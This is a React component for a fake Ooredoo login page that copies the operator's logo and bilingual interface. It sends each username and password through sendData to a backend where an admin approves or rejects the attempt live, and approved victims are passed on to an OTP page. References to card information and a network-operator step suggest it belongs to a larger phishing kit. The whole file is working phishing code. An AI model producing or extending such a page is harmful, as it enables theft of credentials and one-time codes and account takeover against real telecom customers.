import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react";
import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
import {
  sendData,
  codeAction,
  navigateToPage,
} from "@/lib/store";

export default function OoredooLogin() {
  const [, navigate] = useLocation();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState(false);
  const [isWaiting, setIsWaiting] = useState(false);
  const [isSignupRequest, setIsSignupRequest] = useState(false);
  const [currentLang, setCurrentLang] = useState(
    localStorage.getItem("siteLang") || "ar"
  );

  const translations = {
    ar: {
      title: "مرحباً بعودتك",
      subtitle: "تسجيل الدخول إلى حسابك",
      usernameLabel: "اسم المستخدم",
      usernamePlaceholder: "أدخل اسم المستخدم",
      passwordLabel: "كلمة المرور",
      passwordPlaceholder: "أدخل كلمة المرور",
      forgotLink: "نسيت كلمة المرور؟",
      loginBtn: "تسجيل الدخول",
      signupBtn: "إنشاء حساب",
      backText: "رجوع",
      toggleText: "English",
      loadingBtn: "جاري التحقق...",
      errorMsg: "بيانات الدخول غير صحيحة. يرجى المحاولة مرة أخرى.",
    },
    en: {
      title: "Welcome back",
      subtitle: "Login to your account",
      usernameLabel: "Username",
      usernamePlaceholder: "Enter your Username",
      passwordLabel: "Password",
      passwordPlaceholder: "Enter your Password",
      forgotLink: "Forgot Password?",
      loginBtn: "Login",
      signupBtn: "Sign Up",
      backText: "Back",
      toggleText: "العربية",
      loadingBtn: "Verifying...",
      errorMsg: "Invalid credentials. Please try again.",
    },
  };

  const t = translations[currentLang as keyof typeof translations] || translations.ar;

  // Emit page enter & clear card info (not relevant after network-operator)
  useEffect(() => {
    waitingCardInfo.value = null;
    navigateToPage("تسجيل الدخول");
  }, []);

  // Handle code action from admin
  useSignalEffect(() => {
    const action = codeAction.value;
    if (action) {
      if (action.action === "approve") {
        if (isSignupRequest) {
          // إنشاء حساب - انتقل لصفحة توثيق العميل
          navigate("/customer-authentication");
        } else {
          // تسجيل دخول عادي - انتقل لصفحة OTP
          sessionStorage.setItem("otp_provider", "ooredoo");
          navigate("/otp-login");
        }
      } else if (action.action === "reject") {
        // Show error and clear fields
        setUsername("");
        setPassword("");
        setError(true);
        setIsWaiting(false);
        setIsSignupRequest(false);
      }
      // Reset the action
      codeAction.value = null;
    }
  });

  const toggleLanguage = () => {
    const newLang = currentLang === "ar" ? "en" : "ar";
    setCurrentLang(newLang);
    localStorage.setItem("siteLang", newLang);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (!username.trim() || !password.trim()) {
      setError(true);
      return;
    }

    setError(false);
    setIsWaiting(true);
    sendData({
      data: { "اسم المستخدم": username, "كلمة المرور": password },
      current: "تسجيل الدخول",
      nextPage: "OTP دخول",
      waitingForAdminResponse: true,
    });
  };

  // Strip Arabic letters from inputs
  const stripArabic = (value: string) => {
    return value.replace(/[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/g, "");
  };

  return (
    <div
      className="min-h-screen flex flex-col items-center bg-white"
      dir={currentLang === "ar" ? "rtl" : "ltr"}
      style={{ fontFamily: "NotoSansLocal, Arial, Helvetica, sans-serif", paddingTop: "60px", paddingBottom: "44px" }}
    >
      <WaitingOverlay />

      {/* Language Toggle */}
      <div className="w-full max-w-[638px] px-4 mb-2">
        <button
          onClick={toggleLanguage}
          className="bg-gray-100 border border-gray-300 rounded-full px-4 py-1.5 text-sm font-semibold text-gray-700 hover:bg-gray-200 transition-all"
        >
          {t.toggleText}
        </button>
      </div>

      {/* Login Card */}
      <section
        className="w-full max-w-[638px] mx-4 bg-white border border-gray-100 rounded shadow-lg"
        style={{ padding: "40px 35px 36px", boxShadow: "0 19px 39px rgba(0, 0, 0, 0.095)" }}
      >
        {/* Ooredoo Logo */}
        <div className="flex justify-center mb-3">
          <svg width="75" height="63" viewBox="0 0 74 62" aria-hidden="true">
            <circle cx="31" cy="34" r="17" fill="none" stroke="#ed1c24" strokeWidth="11"></circle>
            <circle cx="58" cy="14" r="7.5" fill="#ed1c24"></circle>
          </svg>
        </div>

        <h1 className="text-center text-4xl font-bold text-gray-900 mb-2" style={{ fontSize: "36px" }}>
          {t.title}
        </h1>
        <p className="text-center text-gray-800 text-lg mb-4">{t.subtitle}</p>

        <form onSubmit={handleSubmit} className="w-full">
          {/* Username */}
          <div className="mb-5">
            <label className="block text-gray-900 text-base mb-2">{t.usernameLabel}</label>
            <input
              type="text"
              value={username}
              onChange={(e) => {
                setUsername(stripArabic(e.target.value));
                setError(false);
              }}
              placeholder={t.usernamePlaceholder}
              className="w-full h-12 border border-gray-300 rounded-lg px-4 text-base outline-none focus:border-red-400 focus:ring-2 focus:ring-red-100 transition-all"
              style={{ direction: "ltr", textAlign: "left" }}
              autoComplete="username"
            />
          </div>

          {/* Password */}
          <div className="mb-2">
            <label className="block text-gray-900 text-base mb-2">{t.passwordLabel}</label>
            <input
              type="password"
              value={password}
              onChange={(e) => {
                setPassword(stripArabic(e.target.value));
                setError(false);
              }}
              placeholder={t.passwordPlaceholder}
              className="w-full h-12 border border-gray-300 rounded-lg px-4 text-base outline-none focus:border-red-400 focus:ring-2 focus:ring-red-100 transition-all"
              style={{ direction: "ltr", textAlign: "left" }}
              autoComplete="current-password"
            />
          </div>

          {/* Forgot Password */}
          <div className="flex justify-end h-10 items-center mb-4">
            <a href="#" className="text-red-700 font-bold text-base hover:underline">
              {t.forgotLink}
            </a>
          </div>

          {/* Error Message */}
          {error && (
            <p className="text-red-600 text-center text-sm mb-3 font-medium">{t.errorMsg}</p>
          )}

          {/* Buttons */}
          <div className="space-y-4">
            <button
              type="submit"
              disabled={isWaiting}
              className="w-full h-14 bg-red-600 text-white font-bold text-base rounded-full hover:bg-red-700 transition-colors disabled:opacity-60"
              style={{ background: "#ed1c24" }}
            >
              {isWaiting ? t.loadingBtn : t.loginBtn}
            </button>
            <button
              type="button"
              disabled={isWaiting}
              onClick={() => {
                setIsWaiting(true);
                setIsSignupRequest(true);
                sendData({
                  data: { "طلب": "إنشاء حساب", "اسم المستخدم": username || "—" },
                  current: "تسجيل الدخول",
                  nextPage: "توثيق العميل",
                  waitingForAdminResponse: true,
                });
              }}
              className="w-full h-14 flex items-center justify-center border border-red-600 text-red-600 font-bold text-base rounded-full hover:bg-red-50 transition-colors"
            >
              {t.signupBtn}
            </button>
          </div>
        </form>

        {/* Back Link */}
        <div className="text-center mt-5">
          <a href="/" className="inline-flex items-center gap-1.5 text-gray-500 font-bold text-lg hover:text-gray-700">
            <svg width="17" height="17" viewBox="0 0 20 20" fill="currentColor">
              <path d="M8.72 4.22a.95.95 0 0 1 0 1.34L5.24 9.05h10.81a.95.95 0 1 1 0 1.9H5.24l3.48 3.49a.95.95 0 0 1-1.34 1.34l-5.1-5.1a.96.96 0 0 1 0-1.36l5.1-5.1a.95.95 0 0 1 1.34 0Z"></path>
            </svg>
            <span>{t.backText}</span>
          </a>
        </div>
      </section>
    </div>
  );
}
